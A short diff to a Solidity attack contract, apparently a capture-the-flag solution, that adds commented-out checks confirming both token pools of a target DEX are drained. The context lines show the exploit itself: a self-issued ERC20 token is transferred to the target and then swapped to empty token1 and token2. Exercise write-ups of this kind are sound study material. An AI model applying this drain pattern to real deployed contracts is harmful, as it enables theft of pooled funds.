@@ -24,6 +24,9 @@ contract Attack23 is ERC20 {
         ERC20(address(this)).transfer(address(target), 1); 
         target.swap(address(this), token1, 1); 
         target.swap(address(this), token2, 2); 
+        // check for success
+        // require(token1.balanceOf(address(target)) == 0, "Token1 pool != 0");
+        // require(token2.balanceOf(address(target)) == 0, "Token2 pool != 0");
     }
 }
 
